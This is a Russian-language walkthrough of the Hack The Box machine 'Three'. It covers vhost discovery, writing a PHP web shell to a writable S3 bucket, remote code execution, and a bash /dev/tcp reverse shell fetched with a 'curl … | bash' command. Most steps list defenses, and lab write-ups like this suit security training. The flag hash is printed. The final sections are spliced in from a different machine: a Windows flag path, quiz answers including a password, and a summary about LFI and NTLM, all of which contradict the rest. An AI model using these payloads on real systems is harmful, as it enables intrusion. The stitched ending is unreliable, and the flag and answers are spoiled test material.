# 🧪 Hack The Box: Three

> 🔗 https://app.hackthebox.com/machines/Three

## 🎯 Цель
Получить доступ через:
поиск виртуальных хостов → S3 misconfiguration → загрузка PHP → RCE → reverse shell

---

# 🧠 Общая цепочка атаки

```text
nmap → web enum → vhost discovery → S3 → PHP upload → RCE → reverse shell → flag
```

---

# 🔍 Шаг 1 — Сканирование цели

```bash
nmap -sC -sV <TARGET_IP>
```

## Разбор команды
- `nmap` → сетевой сканер
- `-sC` → запуск стандартных NSE-скриптов
- `-sV` → определение версий сервисов

## Почему это важно
Нужно определить:
- открытые порты
- сервисы
- стек технологий

## Результат
- Порт 80 → HTTP
- Порт 22 → SSH

## Что мы понимаем
- Apache/Ubuntu stack
- Linux web server
- SSH доступен, но данных для входа нет

## Защита
- firewall
- закрытие лишних портов
- скрытие версий сервисов

---

# 🌐 Шаг 2 — Web Enumeration

Открываем:

```bash
http://<TARGET_IP>
```

Смотрим исходный код (`Ctrl+U`).

## Что находим

### PHP backend

```php
/action_page.php
```

## Почему это важно
`.php` означает:
- сервер использует PHP
- возможны file upload
- возможны RCE-уязвимости

---

### Email

```text
mail@thetoppers.htb
```

## Почему это важно
Обнаружен внутренний домен:

```text
thetoppers.htb
```

Его нужно резолвить локально.

---

# 🧩 Добавление домена в hosts

```bash
echo "10.10.10.10 thetoppers.htb" >> /etc/hosts
```

## Разбор команды
- `echo` → вывод текста
- `>>` → добавить в файл
- `/etc/hosts` → локальная таблица DNS-резолва

## Почему это работает

Linux сначала проверяет:

```text
/etc/hosts
```

и только потом обращается к DNS.

То есть система начинает понимать:

```text
thetoppers.htb → 10.10.10.10
```

## Защита
- не раскрывать внутренние домены
- сегментировать инфраструктуру

---

# 🧪 Шаг 3 — Перебор виртуальных хостов

```bash
gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain
```

## Разбор команды
- `vhost` → brute-force виртуальных хостов
- `-w` → словарь
- `-u` → URL цели
- `--append-domain` → автоматически добавляет `.thetoppers.htb`

## Почему это работает

Многие веб-серверы используют:
- скрытые субдомены
- внутренние панели
- отдельные сервисы

через заголовок `Host`.

## Результат

```text
Found: s3.thetoppers.htb
```

Добавляем:

```bash
echo "10.10.10.10 s3.thetoppers.htb" >> /etc/hosts
```

## Защита
- отключать неиспользуемые vhosts
- ограничивать внутренние сервисы

---

# ☁️ Шаг 4 — Идентификация S3

Открываем:

```bash
http://s3.thetoppers.htb
```

## Результат

```json
{"status":"running"}
```

## Что это значит

Запущен LocalStack.

LocalStack — эмулятор AWS-сервисов:
- S3
- Lambda
- DynamoDB
и др.

В данном случае используется:

```text
S3-совместимое облачное хранилище
```

---

# 🔑 Шаг 5 — Настройка AWS CLI

```bash
aws configure
```

## Почему это нужно

AWS CLI требует:
- credentials
- регион
- формат вывода

даже в лабораторной среде.

## Пример

```text
Access Key ID: test
Secret Access Key: test
Region: us-east-1
Output format: json
```

---

# 📦 Просмотр S3 бакетов

```bash
aws --endpoint-url=http://s3.thetoppers.htb s3 ls
```

## Разбор команды
- `--endpoint-url` → кастомный S3 endpoint
- `s3 ls` → список бакетов

## Результат

```text
thetoppers.htb
```

---

# 📂 Просмотр содержимого бакета

```bash
aws --endpoint-url=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

## Результат

```text
index.html
css/
js/
```

## Почему это важно

Бакет:
- публичный
- доступен на запись
- связан с Apache webroot

👉 Критическая cloud misconfiguration.

## Защита
- отключить public write
- uploads хранить вне webroot
- least privilege IAM

---

# 💥 Шаг 6 — Загрузка PHP Web Shell

## Создание shell

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
```

## Разбор кода

### `$_REQUEST["cmd"]`
Получает параметр `cmd` из URL.

Пример:

```text
shell.php?cmd=id
```

---

### `system()`
Функция PHP:
- выполняет системные команды ОС

---

## Загрузка shell

```bash
aws --endpoint-url=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/
```

## Разбор команды
- `s3 cp` → копирование файла в бакет

---

## Выполнение shell

```bash
curl http://thetoppers.htb/shell.php?cmd=id
```

## Почему это работает

Apache исполняет PHP-файлы внутри webroot.

## Результат

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✅ Получено удалённое выполнение кода.

## Защита
- запрет executable uploads
- MIME validation
- disable dangerous PHP functions

---

# 🖥️ Шаг 7 — Reverse Shell

## Узнаём IP атакующей машины

```bash
ip a
```

## Почему это нужно

Целевая машина должна знать:
- куда подключаться обратно

---

# 📄 Создание payload

```bash
echo '#!/bin/bash
bash -i >& /dev/tcp/<ВАШ_IP>/4444 0>&1' > shell.sh
```

## Разбор payload

### `#!/bin/bash`
Использовать bash как интерпретатор.

---

### `bash -i`
Interactive shell:
- интерактивное выполнение команд
- полноценная работа через терминал

---

### `>&`
Редирект stdout/stderr.

То есть:
- вывод команд
- ошибки

перенаправляются в сокет.

---

### `/dev/tcp/IP/PORT`

Специальная возможность bash:
- открыть TCP-соединение как файл

---

### `0>&1`

Перенаправление stdin в тот же сокет.

То есть:
- ввод
- вывод
- ошибки

идут через сетевое соединение.

👉 Итог:
полноценный интерактивный shell через TCP.

---

# 🎧 Listener

```bash
nc -lvnp 4444
```

## Разбор команды
- `nc` → netcat
- `-l` → режим прослушивания
- `-v` → verbose
- `-n` → без DNS
- `-p 4444` → порт 4444

---

# 🌍 HTTP сервер для payload

```bash
python3 -m http.server 8000
```

## Почему это нужно

Быстрый HTTP-сервер для раздачи shell.sh.

## Разбор
- `-m` → запуск Python-модуля
- `http.server` → встроенный web server
- `8000` → порт

---

# 🚀 Запуск reverse shell

```bash
curl "http://thetoppers.htb/shell.php?cmd=curl%20<ВАШ_IP>:8000/shell.sh%20%7C%20bash"
```

## URL encoding
- `%20` → пробел
- `%7C` → `|`

---

## Что происходит

Жертва выполняет:

```bash
curl http://<ВАШ_IP>:8000/shell.sh | bash
```

То есть:
1. скачать payload
2. передать в bash
3. выполнить

---

# 🚩 Шаг 8 — Получение флага

```bash
cat /var/www/flag.txt
```

## Разбор команды
- `cat` → вывод содержимого файла

## Результат

```text
a980d99281a28d638ac68b9bf9453c2b
```

---

# 🛡️ Defensive Lessons

## Главная проблема

Public writable S3 bucket напрямую связан с webroot.

---

## Как должно быть безопасно

- private buckets
- upload validation
- запрет executable uploads
- WAF/EDR
- network segmentation
- outbound traffic filtering

---

# 🧠 Что учит машина

Машина обучает:
- virtual host discovery
- локальному DNS-resolve
- S3 enumeration
- эксплуатации cloud misconfiguration
- PHP RCE
- reverse shell fundamentals

👉 Ошибки конфигурации часто опаснее сложных эксплойтов.




















## 🔐 Флаг

<details>
<summary>Показать флаг</summary>

type C:\Users\mike\Desktop\flag.txt

</details>

---

## 📋 Ответы на задания

<details>
<summary>Показать ответы</summary>

1. unika.htb  
2. php  
3. page  
4. ../../../../windows/system32/drivers/etc/hosts  
5. //IP/file  
6. New Technology Lan Manager  
7. -I  
8. John The Ripper  
9. badminton  
10. 5985  
11. mike  

</details>

---

# 🧠 Итог

👉 Взлом произошёл не из-за одной уязвимости, а из-за цепочки ошибок:

- LFI
- NTLM leakage
- слабый пароль
- открытый WinRM

